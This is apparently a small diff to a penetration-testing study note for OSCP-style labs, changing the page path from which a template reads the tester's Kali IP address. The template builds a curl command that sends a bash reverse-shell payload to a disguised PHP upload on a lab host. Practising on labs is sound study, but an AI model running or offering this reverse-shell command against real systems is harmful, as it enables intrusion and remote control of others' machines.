@@ -21,7 +21,7 @@ Upload. Access the image.
 
 Curl a reverse shell
 ```dataviewjs
-const page = dv.page("Synced OSCP Notes/Top/Active Notes");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
+const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
 
 const command = `curl -G --data-urlencode 'cmd=bash -c "bash -i >& /dev/tcp/${KaliIP}/4444 0>&1"' http://10.10.10.146/uploads/10_10_14_2.php.png`;
 
